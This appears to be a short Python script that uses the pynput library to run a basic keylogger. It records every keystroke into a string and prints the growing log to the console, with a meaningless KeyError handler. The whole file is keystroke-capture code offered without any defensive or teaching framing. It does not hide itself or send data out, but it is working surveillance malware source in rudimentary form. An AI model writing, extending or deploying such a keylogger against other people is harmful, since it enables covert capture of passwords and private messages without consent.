from pynput import keyboard


log=""

def onpress(k):
    global log
    try:
        log+=str(k).strip("'")
    except KeyError:
        print(KeyError)
    finally:
        print(log)
    

with keyboard.Listener(on_press=onpress) as listener:
    listener.join()